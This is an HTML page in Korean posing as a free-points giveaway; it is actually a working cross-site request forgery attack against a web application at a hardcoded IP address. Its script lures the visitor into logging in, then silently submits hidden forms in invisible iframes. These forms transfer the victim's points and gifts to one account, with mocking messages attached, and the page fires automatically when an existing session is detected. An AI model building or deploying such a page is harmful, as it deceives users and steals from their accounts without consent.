<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 특별 이벤트 - 무료 포인트 지급!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.18);
            max-width: 500px;
            width: 90%;
        }
        .title { font-size: 2.5em; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
        .subtitle { font-size: 1.2em; margin-bottom: 30px; opacity: 0.9; }
        .countdown { font-size: 3em; color: #FFD700; font-weight: bold; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); margin: 20px 0; }
        .progress-bar { width: 100%; height: 20px; background: rgba(255,255,255,0.3); border-radius: 10px; overflow: hidden; margin: 20px 0; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #00ff88, #00cc6a); width: 0%; transition: width 0.5s ease; border-radius: 10px; }
        .success { color: #00FF88; font-size: 1.8em; font-weight: bold; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
        .pulse { animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
        .login-section { background: rgba(255,255,255,0.2); padding: 20px; border-radius: 15px; margin: 20px 0; }
        .auto-btn { background: linear-gradient(45deg, #FF6B6B, #4ECDC4); border: none; padding: 15px 30px; border-radius: 25px; color: white; font-size: 1.2em; cursor: pointer; margin: 10px; }
        .auto-btn:hover { transform: scale(1.05); }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="title pulse">🎁 특별 이벤트!</h1>
        <p class="subtitle">무료 포인트 지급 시스템에 연결되었습니다</p>
        
        <!-- 로그인 필요 섹션 -->
        <div id="login-section" class="login-section">
            <h2>🔐 보안 인증 필요</h2>
            <p>포인트 지급을 위해 로그인이 필요합니다</p>
            <button class="auto-btn" onclick="autoLoginAndAttack()">🚀 자동 로그인 후 포인트 받기</button>
            <p style="font-size: 0.9em; opacity: 0.8; margin-top: 10px;">
                클릭하면 로그인 창이 열립니다.<br>로그인 후 자동으로 포인트가 지급됩니다!
            </p>
        </div>
        
        <div id="loading-section" style="display: none;">
            <div class="loading">
                <p>💰 포인트 지급을 준비하고 있습니다...</p>
                <p class="countdown" id="countdown">5</p>
                <p>초 후 자동으로 포인트가 지급됩니다!</p>
            </div>
            <div class="progress-bar"><div class="progress-fill" id="progressBar"></div></div>
            <p id="status">🔄 로그인 확인 중...</p>
        </div>
        
        <div id="success-section" style="display: none;">
            <h2 class="success pulse">✅ 포인트 지급 완료!</h2>
            <p style="font-size: 1.3em; margin: 20px 0;">💰 150P가 성공적으로 지급되었습니다!</p>
            <p style="opacity: 0.8;">포인트는 즉시 계정에 반영됩니다.</p>
        </div>
    </div>

    <div style="position: absolute; left: -9999px; top: -9999px;" id="iframeContainer"></div>

    <script>
        let countdown = 5;
        let loginWindow = null;
        let attackInProgress = false;
        
        const countdownEl = document.getElementById('countdown');
        const statusEl = document.getElementById('status');
        const progressBar = document.getElementById('progressBar');
        const loginSection = document.getElementById('login-section');
        const loadingSection = document.getElementById('loading-section');
        const successSection = document.getElementById('success-section');
        
        // 자동 로그인 + 공격 함수
        function autoLoginAndAttack() {
            console.log('🚀 자동 로그인 프로세스 시작!');
            
            // 로그인 섹션 숨기고 로딩 표시
            loginSection.style.display = 'none';
            loadingSection.style.display = 'block';
            statusEl.textContent = '🔓 로그인 창을 여는 중...';
            
            // 로그인 창 열기
            loginWindow = window.open(
                'http://3.35.218.180/login.php',
                'loginWindow',
                'width=600,height=700,scrollbars=yes,resizable=yes'
            );
            
            // 로그인 창 포커스
            if (loginWindow) {
                loginWindow.focus();
                statusEl.textContent = '🔑 로그인을 완료해주세요...';
                
                // 로그인 완료 감지
                startLoginDetection();
            } else {
                alert('팝업이 차단되었습니다! 팝업 허용 후 다시 시도해주세요.');
                loginSection.style.display = 'block';
                loadingSection.style.display = 'none';
            }
        }
        
        // 로그인 완료 감지
        function startLoginDetection() {
            const checkInterval = setInterval(() => {
                try {
                    // 로그인 창이 닫혔는지 확인
                    if (loginWindow.closed) {
                        clearInterval(checkInterval);
                        console.log('🔓 로그인 창 닫힌 것 확인됨!');
                        statusEl.textContent = '✅ 로그인 완료 감지! 포인트 지급 준비...';
                        
                        // 2초 후 공격 시작
                        setTimeout(startCountdownAttack, 2000);
                        return;
                    }
                    
                    // 로그인 완료 URL 체크 시도
                    try {
                        const currentUrl = loginWindow.location.href;
                        if (currentUrl.includes('index.php') || currentUrl.includes('profile.php') || currentUrl.includes('main.php')) {
                            clearInterval(checkInterval);
                            console.log('✅ 로그인 성공 URL 감지!');
                            loginWindow.close();
                            statusEl.textContent = '✅ 로그인 성공! 포인트 지급 시작...';
                            setTimeout(startCountdownAttack, 1000);
                        }
                    } catch(e) {
                        // CORS 에러는 정상 (다른 도메인이므로)
                    }
                    
                } catch(error) {
                    console.log('로그인 상태 확인 중...', error);
                }
            }, 1000);
            
            // 30초 후 타임아웃
            setTimeout(() => {
                if (loginWindow && !loginWindow.closed) {
                    clearInterval(checkInterval);
                    console.log('⏰ 로그인 타임아웃 - 강제 공격 시작');
                    statusEl.textContent = '⏰ 시간 초과 - 포인트 지급 강제 시작...';
                    loginWindow.close();
                    setTimeout(startCountdownAttack, 1000);
                }
            }, 30000);
        }
        
        // 카운트다운 + 공격 시작
        function startCountdownAttack() {
            if (attackInProgress) return;
            attackInProgress = true;
            
            console.log('⏱️ 카운트다운 시작!');
            statusEl.textContent = '💰 포인트 지급 시스템 초기화 중...';
            
            const countdownTimer = setInterval(() => {
                countdown--;
                countdownEl.textContent = countdown;
                progressBar.style.width = ((5-countdown) * 20) + '%';
                
                const messages = [
                    '🔄 서버 연결 확인 중...',
                    '🔐 보안 토큰 생성 중...',
                    '💰 포인트 지급 준비 중...',
                    '🚀 최종 확인 중...',
                    '✨ 포인트 전송 시작!'
                ];
                
                if (5-countdown < messages.length) {
                    statusEl.textContent = messages[4-countdown];
                }
                
                if (countdown <= 0) {
                    clearInterval(countdownTimer);
                    executeIframeAttack();
                }
            }, 1000);
        }
        
        // iframe 공격 실행
        function executeIframeAttack() {
            console.log('🎯 iframe CSRF 공격 시작!');
            statusEl.textContent = '💸 포인트를 전송하고 있습니다...';
            progressBar.style.width = '100%';
            
            const attacks = [
                {
                    receiver_id: '13',
                    points: '50',
                    send_gift: '1', 
                    gift_type: 'coffee',
                    message: '🔥 대머리'
                },
                {
                    receiver_id: '13',
                    points: '35',
                    send_gift: '1',
                    gift_type: 'cake', 
                    message: '🔥 빡빡이!'
                },
                {
                    receiver_id: '13',
                    points: '30',
                    send_gift: '1',
                    gift_type: 'flower',
                    message: '🔥 탈모빔'
                }
            ];
            
            let completedAttacks = 0;
            
            attacks.forEach((attackData, index) => {
                setTimeout(() => {
                    launchIframeAttack(attackData, index + 1, () => {
                        completedAttacks++;
                        if (completedAttacks === attacks.length) {
                            setTimeout(showSuccess, 2000);
                        }
                    });
                }, index * 2500);
            });
        }
        
        // 개별 iframe 공격
        function launchIframeAttack(attackData, attackNum, callback) {
            console.log(`🚀 공격 ${attackNum} 시작: ${attackData.points}P`);
            
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.name = `attack_${Date.now()}_${attackNum}`;
            
            iframe.onload = () => {
                console.log(`✅ 공격 ${attackNum} 완료!`);
                statusEl.textContent = `💸 공격 ${attackNum}/3 완료 (${attackData.points}P 전송됨)`;
                if (callback) callback();
            };
            
            document.getElementById('iframeContainer').appendChild(iframe);
            
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://3.35.218.180/profile.php';
            form.target = iframe.name;
            form.style.display = 'none';
            
            Object.keys(attackData).forEach(key => {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = key;
                input.value = attackData[key];
                form.appendChild(input);
            });
            
            document.body.appendChild(form);
            form.submit();
            
            setTimeout(() => {
                if (form.parentNode) document.body.removeChild(form);
            }, 3000);
        }
        
        function showSuccess() {
            loadingSection.style.display = 'none';
            successSection.style.display = 'block';
            document.title = '✅ 포인트 지급 완료!';
            
            console.log('🎉 모든 공격 완료!');
            console.log('💰 총 115P 전송!');
            console.log('🏴‍☠️ hacker 계정 확인!');
        }
        
        // 페이지 로드시 자동 실행도 시도
        window.onload = function() {
            console.log('🎯 자동 공격 페이지 로드됨');
            console.log('🔑 수동/자동 로그인 후 공격 가능');
            
            // 혹시 이미 로그인되어 있다면 바로 시도
            setTimeout(() => {
                testExistingSession();
            }, 2000);
        };
        
        // 기존 세션 테스트
        function testExistingSession() {
            const testIframe = document.createElement('iframe');
            testIframe.style.display = 'none';
            testIframe.src = 'http://3.35.218.180/profile.php';
            testIframe.onload = function() {
                try {
                    // 세션이 있으면 바로 공격
                    console.log('🔓 기존 세션 발견! 바로 공격 시작!');
                    loginSection.style.display = 'none';
                    loadingSection.style.display = 'block';
                    setTimeout(startCountdownAttack, 1000);
                } catch(e) {
                    console.log('❌ 로그인 필요');
                }
                document.body.removeChild(testIframe);
            };
            document.body.appendChild(testIframe);
        }
        
        console.log('🎯 완전 자동화 CSRF 공격 페이지!');
        console.log('🔑 로그인 → 자동 공격 → 115P 전송');
    </script>
</body>
</html>
